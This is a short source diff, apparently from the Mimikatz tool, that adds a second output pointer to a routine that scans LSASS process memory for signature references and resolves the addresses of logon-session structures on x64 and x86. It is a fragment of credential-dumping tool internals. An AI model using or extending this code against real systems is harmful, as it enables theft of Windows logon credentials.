@@ -41,10 +41,10 @@ BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKUR
 #ifdef _M_X64
 	LsaSrvReferences[4].Offsets.off1 = (pLib->Informations.TimeDateStamp > 0x53480000) ? -54 : -61; // 6.2 post or pre KB
 #endif
-	return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  ARRAYSIZE(LsaSrvReferences), (PVOID *) &LogonSessionList, pLogonSessionListCount, NULL);
+	return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  ARRAYSIZE(LsaSrvReferences), (PVOID *) &LogonSessionList, pLogonSessionListCount, NULL, NULL);
 }
 
-BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID * genericPtr, PVOID * genericPtr1, PLONG genericOffset1)
+BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID * genericPtr, PVOID * genericPtr1, PVOID * genericPtr2, PLONG genericOffset1)
 {
 	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
 	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {NULL, &hLocalMemory};
@@ -80,6 +80,19 @@ BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL
 					*genericPtr1 = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
 			#elif defined _M_IX86
 				aLocalMemory.address = genericPtr1;
+				pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
+			#endif
+			}
+
+			if(genericPtr2)
+			{
+				aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off2;
+			#ifdef _M_X64
+				aLocalMemory.address = &offset;
+				if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
+					*genericPtr2 = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
+			#elif defined _M_IX86
+				aLocalMemory.address = genericPtr2;
 				pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID));
 			#endif
 			}
